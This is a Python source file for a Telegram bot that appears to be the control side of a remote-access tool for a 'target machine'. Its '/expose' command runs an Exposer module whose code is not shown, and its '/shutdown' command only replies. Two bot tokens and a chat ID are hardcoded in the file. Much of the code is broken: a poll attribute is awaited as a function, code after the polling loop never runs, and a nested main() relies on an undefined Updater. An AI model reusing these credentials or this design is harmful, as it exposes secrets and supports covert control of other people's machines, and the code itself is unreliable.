from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from exposer import Exposer


async def hello(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    
    await update.message.reply_text(f'Hello Ninja 🥷🥷 {update.effective_user.first_name}')

async def tester(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    #await update.poll.question(f'Whats Your Real Name???? {update.effective_user.first_name}')
    await update.poll.options(f'Whats Your Real Name???? {update.effective_user.first_name}')

async def exposer(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(f'Exposer start {update.effective_user.last_name}')
    exposer = Exposer()
    await exposer.run()

async def shuting_down(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(f'Target Machine Shuting Down {update.effective_user.first_name}')

yakuzaPC_bot_Token = '7532826397:AAGzzehJxbVC5bj1jIDkY3DRjDo8MtjPLAQ'
dayaId = '673330561'

app = ApplicationBuilder().token(yakuzaPC_bot_Token).build()

app.add_handler(CommandHandler("hello", hello))
app.add_handler(CommandHandler("test", tester))
app.add_handler(CommandHandler("expose", exposer))
app.add_handler(CommandHandler("shutdown", shuting_down))

app.run_polling()

class MessageReciever():
    import logging
    #from telegram.ext import Updater, CommandHandler

    logging.basicConfig(level=logging.INFO)

    TOKEN = '7381866212:AAEh7VRd5sdOOz7tISehbaGsX0-y_lrc3os'

    def get_last_message(updater):
        updates = updater.get_updates()
        if updates:
            last_update = updates[-1]
            message = last_update.message
            print(f"Last message: {message.text}")
        else:
            print("No updates found")

        def main():
            updater = Updater(TOKEN)
            dp = updater.dispatcher

            dp.add_handler(CommandHandler('get_last_message', get_last_message))

            updater.start_polling()
            updater.idle()

        if __name__ == '__main__':
            main()
